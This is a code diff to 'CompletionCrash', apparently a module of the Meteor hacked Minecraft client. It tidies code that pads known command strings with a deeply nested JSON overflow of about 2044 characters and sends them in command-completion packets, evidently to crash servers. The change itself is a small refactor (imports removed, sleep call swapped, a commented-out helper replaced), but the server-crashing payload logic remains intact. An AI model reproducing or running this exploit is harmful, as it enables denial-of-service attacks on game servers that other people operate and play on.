@@ -5,13 +5,8 @@ import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Module;
-import com.google.gson.JsonObject;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
-
-import java.util.concurrent.TimeUnit;
-import java.util.stream.Collectors;
-import java.util.stream.IntStream;
 
 public class CompletionCrash extends Module {
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
@@ -79,7 +74,7 @@ public class CompletionCrash extends Module {
             messageIndex = 0;
             return;
         }
-        TimeUnit.SECONDS.sleep(1);
+        Thread.sleep(1000);
         String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;
         int len = 2044 - knownMessage.length();
         String overflow = generateJsonObject(len);
@@ -94,14 +89,7 @@ public class CompletionCrash extends Module {
     private void onGameLeft(GameLeftEvent event) {
         if (autoDisable.get()) toggle();
     }
-
-    /*private String generateJsonObject(int levels) {
-        String in = IntStream.range(0, levels)
-            .mapToObj(i -> "[")
-            .collect(Collectors.joining());
-        String json = "{a:" + in + "}";
-        return json;
-    }*/
+    
     private String generateJsonObject(int levels) {
         StringBuilder builder = new StringBuilder("{a:");
         for (int i = 0; i < levels; i++) {
